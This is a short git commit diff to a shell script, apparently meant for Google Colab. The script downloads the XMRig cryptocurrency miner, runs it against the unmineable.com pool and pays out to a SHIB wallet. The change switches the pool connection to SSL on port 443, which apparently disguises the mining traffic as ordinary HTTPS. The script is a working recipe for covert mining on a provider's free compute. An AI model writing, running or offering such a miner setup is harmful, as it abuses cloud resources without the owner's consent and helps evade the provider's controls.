594fb1dd2f700b38b701412c6130f8911d95fc6f
burocos <112254195+burocos@users.noreply.github.com>
2022-09-01 01:22:32 +0800

    Update gcolab-us.sh

--- gcolab-us.sh
+++ gcolab-us.sh
@@ -10,4 +10,4 @@ screen -R xmr
 wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz
 tar xvf xmrig-6.18.0-linux-x64.tar.gz
 cd xmrig-6.18.0
-./xmrig -o rx.unmineable.com:3333 -a rx -k -u SHIB:0x8cc95e87e9110269f61e5f40e88dbe6c347e7ac0.GLAB
+./xmrig -o stratum+ssl://rx.unmineable.com:443 -a rx -k -u SHIB:0x8cc95e87e9110269f61e5f40e88dbe6c347e7ac0.GLAB
